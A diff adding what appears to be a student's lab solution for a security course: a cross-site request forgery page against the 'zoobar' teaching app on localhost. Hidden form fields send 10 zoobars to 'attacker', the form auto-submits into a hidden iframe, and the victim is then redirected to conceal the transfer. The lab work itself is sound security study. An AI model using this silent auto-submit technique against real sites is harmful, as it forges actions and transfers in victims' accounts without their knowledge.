@@ -1,0 +1,36 @@
+
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="my_iframe">
+<p>Send <input name="zoobars_orig" type="text" value="" size=5> zoobars</p>
+<p>to <input name=recipientold type=text value="" size=10></p>
+
+<input name="zoobars" type="text" value="10" size=5 style="display:none">
+<input name=recipient type=text value="attacker" size=10 style="display:none">
+<input type="submit" name="submission" value="Send">
+</form>
+
+
+<!-- when the form is submitted, the server response will appear in this iframe -->
+<iframe id="attack_iframe" name="my_iframe" src="" style="display:none"></iframe>
+
+<script type="text/javascript">
+    // document.forms[0].submit();
+    document.getElementsByName("transferform")[0].submit();
+
+    //exercise 8
+    var iframe = document.getElementById("attack_iframe");
+    iframe.addEventListener("load",function loadredy(argument) {
+            //alert('myframe is loaded'); 
+            console.log('myframe is loaded');
+            window.location = "http://css.csail.mit.edu/6.858/2015/"        
+           // window.parent.loaction.href = "http://css.csail.mit.edu/6.858/2015/"        
+    },false);
+
+    // also ok!
+    // iframe.onload = function() { 
+    //  alert('myframe is loaded'); 
+    //  console.log('myframe is loaded');
+    //  window.location = "http://css.csail.mit.edu/6.858/2015/"
+    // };
+    //iframe.src = 'http://css.csail.mit.edu/6.858/2015/';
+
+</script>
